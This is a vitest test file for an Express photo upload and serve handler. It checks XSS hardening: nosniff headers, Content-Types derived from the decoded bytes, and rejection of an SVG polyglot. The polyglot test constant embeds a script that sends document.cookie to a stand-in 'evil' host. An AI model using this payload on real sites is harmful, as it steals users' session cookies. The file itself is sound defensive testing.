import { Readable } from 'node:stream'

import type { Request, Response } from 'express'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// Mocks for the @molecule/* deps the uploads handler imports. getProvider for
// both uploads + image are vi.fns so each test can shape the provider.
vi.mock('@molecule/api-uploads', () => ({ getProvider: vi.fn() }))
vi.mock('@molecule/api-image', () => ({ getProvider: vi.fn() }))
vi.mock('@molecule/api-i18n', () => ({
  t: (_key: string, _values: unknown, opts?: { defaultValue?: string }) =>
    opts?.defaultValue ?? _key,
}))
vi.mock('@molecule/api-logger', () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn(), trace: vi.fn() },
}))
vi.mock('@molecule/api-bonds-default-express', () => ({
  getUserId: vi.fn(() => 'user-1'),
}))

import { getProvider as getImage } from '@molecule/api-image'
import { getProvider as getUploads } from '@molecule/api-uploads'

import { photoFilesRouter, uploadsRouter } from '../handlers/uploads.js'

/** A minimal Response double capturing status/headers/body. */
function mockRes() {
  const res = {
    statusCode: 200,
    headers: {} as Record<string, string>,
    body: undefined as unknown,
    ended: false,
    setHeader(key: string, value: string) {
      this.headers[key.toLowerCase()] = value
      return this
    },
    getHeader(key: string) {
      return this.headers[key.toLowerCase()]
    },
    status(code: number) {
      this.statusCode = code
      return this
    },
    json(obj: unknown) {
      this.body = obj
      this.ended = true
      return this
    },
    send(obj: unknown) {
      this.body = obj
      this.ended = true
      return this
    },
    end() {
      this.ended = true
      return this
    },
  }
  return res
}

/** Pull the single GET /:id serve handler out of the router. */
function getServeHandler() {
  const route = photoFilesRouter.stack.find((l) => l.route)?.route
  if (!route) throw new Error('serve route not found')
  return route.stack[0].handle as (req: Request, res: Response) => Promise<void>
}

/** Run the POST / upload chain (busboy middleware + handler). */
async function runUpload(req: Readable & { method: string; headers: Record<string, string> }) {
  const route = uploadsRouter.stack.find((l) => l.route)?.route
  if (!route) throw new Error('upload route not found')
  const middleware = route.stack[0].handle as (req: unknown, res: unknown, next: () => void) => void
  const handler = route.stack[1].handle as (req: unknown, res: unknown) => Promise<void>
  const res = mockRes()
  await new Promise<void>((resolve) => middleware(req, res, () => resolve()))
  await handler(req, res)
  return res
}

/** Build a multipart/form-data body carrying a single `photo` part. */
function multipartReq(opts: { declaredType: string; bytes: Buffer | string; filename: string }) {
  const boundary = '----moltestboundary'
  const body = Buffer.concat([
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${opts.filename}"\r\n` +
        `Content-Type: ${opts.declaredType}\r\n\r\n`,
    ),
    Buffer.isBuffer(opts.bytes) ? opts.bytes : Buffer.from(opts.bytes),
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ])
  const req = Readable.from(body) as Readable & {
    method: string
    headers: Record<string, string>
  }
  req.method = 'POST'
  req.headers = {
    'content-type': `multipart/form-data; boundary=${boundary}`,
    'content-length': String(body.length),
  }
  return req
}

// An SVG polyglot whose leading XML comment lets a browser sniff it as HTML.
const SVG_POLYGLOT =
  '<!-- --><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
  "<script>fetch('https://evil/'+document.cookie)</script></svg>"

beforeEach(() => {
  vi.mocked(getUploads).mockReset()
  vi.mocked(getImage).mockReset()
})

describe('photo-files serve route (XSS hardening)', () => {
  it('always sends nosniff + a validated image/* Content-Type for a raster file', async () => {
    const pngBytes = Buffer.from('fake-png-bytes')
    vi.mocked(getUploads).mockReturnValue({
      getFile: async () => Readable.from(pngBytes),
    } as unknown as ReturnType<typeof getUploads>)
    vi.mocked(getImage).mockReturnValue({
      getMetadata: async () => ({ width: 10, height: 10, format: 'png', size: pngBytes.length }),
    } as unknown as ReturnType<typeof getImage>)

    const res = mockRes()
    await getServeHandler()(
      { params: { id: 'key-1' } } as unknown as Request,
      res as unknown as Response,
    )

    expect(res.statusCode).toBe(200)
    // The decisive fix: browser must never sniff the bytes to text/html.
    expect(res.getHeader('X-Content-Type-Options')).toBe('nosniff')
    expect(res.getHeader('Content-Type')).toBe('image/png')
    expect(res.getHeader('Content-Disposition')).toContain('inline')
    expect(Buffer.isBuffer(res.body)).toBe(true)
  })

  it('refuses to serve a stored SVG polyglot (415, no html-sniffable bytes piped)', async () => {
    const svgBytes = Buffer.from(SVG_POLYGLOT)
    vi.mocked(getUploads).mockReturnValue({
      getFile: async () => Readable.from(svgBytes),
    } as unknown as ReturnType<typeof getUploads>)
    vi.mocked(getImage).mockReturnValue({
      getMetadata: async () => ({ width: 10, height: 10, format: 'svg', size: svgBytes.length }),
    } as unknown as ReturnType<typeof getImage>)

    const res = mockRes()
    await getServeHandler()(
      { params: { id: 'key-svg' } } as unknown as Request,
      res as unknown as Response,
    )

    expect(res.statusCode).toBe(415)
    // Never emit a Content-Type the browser could parse as a document, and
    // never send the raw script bytes back.
    expect(res.getHeader('Content-Type')).toBeUndefined()
    expect(res.body).not.toBe(svgBytes)
  })
})

describe('photo-uploads gate (byte-validated format)', () => {
  function uploadProviderSpy() {
    const upload = vi.fn((..._args: unknown[]) => ({
      id: 'stored-key',
      uploaded: true,
      location: null,
      uploadPromise: Promise.resolve(),
    }))
    vi.mocked(getUploads).mockReturnValue({ upload } as unknown as ReturnType<typeof getUploads>)
    return upload
  }

  it('rejects an SVG polyglot that lies about its mime type (image/png)', async () => {
    const upload = uploadProviderSpy()
    vi.mocked(getImage).mockReturnValue({
      // sharp parses the SVG (legal XML comment in the prolog) → has dims.
      getMetadata: async () => ({ width: 10, height: 10, format: 'svg', size: 80 }),
    } as unknown as ReturnType<typeof getImage>)

    const res = await runUpload(
      multipartReq({ declaredType: 'image/png', bytes: SVG_POLYGLOT, filename: 'x.png' }),
    )

    expect(res.statusCode).toBe(415)
    // The malicious bytes must never reach storage.
    expect(upload).not.toHaveBeenCalled()
  })

  it('accepts a real raster image and persists a byte-derived Content-Type', async () => {
    const upload = uploadProviderSpy()
    vi.mocked(getImage).mockReturnValue({
      getMetadata: async () => ({ width: 10, height: 10, format: 'png', size: 12 }),
    } as unknown as ReturnType<typeof getImage>)

    const res = await runUpload(
      multipartReq({ declaredType: 'image/png', bytes: 'real-png', filename: 'x.png' }),
    )

    expect(res.statusCode).toBe(201)
    expect(upload).toHaveBeenCalledTimes(1)
    // Stored mime is derived from the decoded format, never the client value.
    const meta = upload.mock.calls[0][2] as { mimeType: string }
    expect(meta.mimeType).toBe('image/png')
    expect((res.body as { mimeType: string }).mimeType).toBe('image/png')
  })
})
